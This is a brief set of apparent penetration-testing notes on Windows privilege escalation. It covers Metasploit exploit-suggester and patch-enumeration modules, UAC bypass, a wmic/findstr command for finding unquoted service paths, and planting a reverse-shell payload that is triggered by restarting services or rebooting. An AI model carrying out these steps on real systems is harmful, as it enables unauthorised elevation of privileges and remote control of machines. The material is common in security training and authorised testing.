---------------------------------------------

1. use post/multi/recon/local_exploit_suggester...

2. use post/gather/enum_patches -> search for KB patches and set with a seperating comma.

3. try to bypass UAC ->
search for 'uac' in metasploit, always set technique to PSH(powershell).

4. look for Unquoted Paths -> 
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

if found, go through directories and list permissions with icacls on each dir.
Insert payload(and set to windows/shell_reverse_tcp) and BAM.

# sc qc "vulnsvc" -> Query service config
# try sc stop/start
# shutdown /r /t 0 -> Restart endpoint to restart services aggressively
